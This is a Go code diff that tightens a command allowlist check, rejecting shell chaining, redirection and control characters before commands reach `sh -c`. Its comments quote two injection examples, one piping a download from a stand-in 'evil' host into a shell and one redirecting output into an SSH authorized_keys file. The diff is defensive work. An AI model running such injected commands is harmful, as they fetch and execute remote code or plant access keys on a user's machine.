@@ -97,21 +97,28 @@ func (inv *Investigator) SetCommandAllowlist(allowlist []string) {
 
 // isCommandAllowed checks whether a command is permitted by the allowlist.
 // If the allowlist is empty, all commands are allowed for backward compatibility.
-// Commands containing shell chaining operators (;, &&, ||, |, $, `) are always
-// rejected to prevent command injection through prefix matching.
+// Commands containing any shell metacharacter — chaining (;, &, |, $, `),
+// redirection (<, >), or control/escape bytes — are always rejected to prevent
+// injection (and out-of-repo redirection) through prefix matching, since the
+// command is ultimately handed to `sh -c`.
 func (inv *Investigator) isCommandAllowed(command string) bool {
 	trimmed := strings.TrimSpace(command)
 	if trimmed == "" {
 		return false
 	}
 
-	// Reject shell chaining operators FIRST, before the empty-allowlist
+	// Reject shell metacharacters FIRST, before the empty-allowlist
 	// short-circuit. Otherwise a config with an explicitly empty
 	// command_allowlist would allow injection like "ls; curl evil | sh".
-	for _, ch := range []string{";", "&&", "||", "|", "$(", "`", "\n"} {
-		if strings.Contains(trimmed, ch) {
-			return false
-		}
+	// This is the same forbidden set enforced by the gemma runtime's
+	// run_command tool (internal/runtime/gemma.go) and the criteria command
+	// evaluator; the investigator must not be a weaker gate. Crucially it
+	// includes redirection (<, >) — a prefix-matched command such as
+	// "cat go.mod > /home/user/.ssh/authorized_keys" otherwise passes and
+	// `sh -c` writes to an absolute path outside cmd.Dir (the repo).
+	const forbidden = ";&|$`<>\n\r\t\x00\\"
+	if strings.ContainsAny(trimmed, forbidden) {
+		return false
 	}
 
 	if len(inv.commandAllowlist) == 0 {
